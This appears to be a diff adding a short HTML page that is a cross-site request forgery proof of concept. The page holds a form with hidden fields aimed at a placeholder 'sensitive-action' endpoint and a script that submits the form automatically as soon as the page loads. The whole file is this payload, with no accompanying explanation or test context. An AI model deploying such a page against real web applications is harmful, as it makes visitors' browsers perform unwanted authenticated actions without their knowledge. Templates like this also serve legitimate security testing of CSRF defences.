@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <form action="http://your-web-app.com/sensitive-action" method="POST">
+    <input type="hidden" name="action_param1" value="value1">
+    <input type="hidden" name="action_param2" value="value2">
+    <input type="submit" value="Submit">
+  </form>
+  <script>document.forms[0].submit();</script>
+</body>
+</html>
